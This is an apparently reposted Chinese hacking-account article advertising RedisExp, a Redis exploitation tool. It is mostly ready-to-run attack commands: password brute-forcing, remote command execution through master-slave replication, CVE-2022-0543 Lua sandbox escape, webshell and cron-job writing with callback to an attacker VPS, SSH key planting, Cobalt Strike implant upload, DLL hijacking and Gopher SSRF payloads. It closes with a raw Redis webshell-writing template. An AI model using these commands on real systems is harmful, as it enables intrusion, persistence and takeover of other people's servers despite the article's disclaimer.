<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZneaBzwQDw-9pdjuhqZCFw)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/g68qqsJpeZKsrKlmYk17kbwCYXWnlzRQeRgib1F9gI8HCAmyaxn8aD5JP26vMBlnGDQPMUWQQAicMvFibYKyunibAg/640?wx_fmt=png&from=appmsg)

**简介：**

Redis 是一种高性能的键值存储系统，常用于缓存、数据库以及消息队列等多种场景。由于其高度的灵活性和广泛的用途，Redis 也面临各种安全漏洞。此工具是 yuyan-sec 使用 golang 写的一款 Redis 漏洞利用工具。工具提供了一个强大的框架来检测 Redis 服务器的安全漏洞。

**注意：**

主从复制会清空数据，请注意使用！切勿非法测试，一切后果自负！

```
██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝

```

**命令示例：**  

基本连接：

```
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456

```

爆破 Redis 密码：  

```
RedisExp.exe brute -r 目标IP -p 目标端口 -f 字典文件
RedisExp.exe brute -r 192.168.19.1 -f pass.txt

```

主从复制执行命令：  

```
RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行]
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -c whoami (单次执行)
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -f exp.so (Linux)

```

主从复制文件上传：  

```
RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -d 目标路径 -f 目标文件名 -F 本地文件
RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -d c:\\中文\\ -f shell.php -F shell.txt -g
RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -f shell.php -F shell.txt

```

关闭主从复制：

```
RedisExp.exe close -r 192.168.19.1

```

Lua 沙盒绕过命令执行 (CVE-2022-0543)：  

```
RedisExp.exe lua -r 192.168.19.6 -c whoami

```

写入 Webshell：  

```
RedisExp.exe shell -r 目标IP -p 目标端口 -w 密码 -d 目标路径 -f 目标文件名 -s Webshell内容
RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "<?php phpinfo();?>" -g
RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "PD9waHAgcGhwaW5mbygpOz8+" -g -b

```

写入 Linux 计划任务：  

```
RedisExp.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
RedisExp.exe cron -r 192.168.19.1 -L 127.0.0.1 -P 2222

```

写入 SSH 公钥：  

```
RedisExp.exe ssh -r 目标IP -p 目标端口 -w 密码 -n 用户名 -s 公钥
RedisExp.exe ssh -r 192.168.19.1 -u root -s "ssh-rsa AAAAB"

```

执行 Redis 命令：  

```
RedisExp.exe cli -r 192.168.19.1

```

生成 Gopher SSRF Redis Payload：  

```
RedisExp.exe gopher -f 1.txt

```

具体命令使用 - h 查看  

**详细用法：**  

加载 DLL 和 SO 文件：  

```
exp.dll 和 exp.so 来自 https://github.com/0671/RabR 内容已经分别加载到 dll.go 和 so.go 中，可以直接调用。

```

写入 Webshell：  

```
在写入 Webshell 时，由于存在特殊字符，可以使用 Base64 对 Webshell 进行编码，然后使用 -b 参数来解码。

```

处理带空格的路径：  

```
对于包含空格的目录或文件路径，建议使用双引号和单引号组合表示，例如 'a b'。

```

关闭 Redis 压缩：  

```
在写入乱码时，可以关闭 Redis 压缩。工具在写入 shell 时默认会关闭压缩，写入后再恢复开启压缩。
config set rdbcompression no

```

设置 stop-writes-on-bgsave-error：  

```
默认情况下，stop-writes-on-bgsave-error 的值为 yes。如果 Redis 开启了 RDB 持久化并且最后一次备份失败了，Redis 默认会停止写入操作，以提醒用户数据持久化出现问题。临时解决方案是将 stop-writes-on-bgsave-error 设置为 no，但这样做只是暂时忽略问题，而不是解决问题。工具会在启动时将其设置为 no，并在退出时恢复为 yes。
config set stop-writes-on-bgsave-error no

```

DLL 劫持：  

```
可以利用 dbghelp.dll 进行 DLL 劫持，详情参见 https://github.com/P4r4d1se/dll_hijack。

```

上传 CS 马：

```
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp c:\users\public -rf test.exe -lf artifact.exe

```

上传 dbghelp.dll 进行劫持：

```
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp . -rf dbghelp.dll -lf dbghelp.dll

```

触发 DLL 劫持：

```
.\RedisEXP.exe -m bgsave -r 127.0.0.1 -p 6378 -w 123456

```

生成 Gopher Payload：

```
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件

```

写入 Shell 模板：

```
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
bgsave

```

**报错示例：**

工具报错：

```
[ERR Error loading the extension. Please check the server logs.] module load /tmp/exp.so

```

服务端报错：

```
Module /tmp/exp.so failed to load: It does not have execute permissions.

```

这种情况可能是由于 Redis 版本过高，exp.so 没有执行权限导致加载失败，具体原因需要查看服务端的日志。

*   公众号回复 “8986” 获取下载链接
    

**用您发财的小手点个赞鼓励一下吧❥(^_-)**

**关注公众号便于更好的为您分享 (#^.^#)**

**免责****声明** 

本公众号 “黑客之道 HackerWay” 提供的资源仅供学习，利⽤本公众号 “黑客之道 HackerWay” 所提供的信息而造成的任何直接或者间接的后果及损失，均由使⽤者本⼈负责，本公众号 “黑客之道 HackerWay” 及作者不为此承担任何责任，一旦造成后果请自行承担责任！

谢谢 !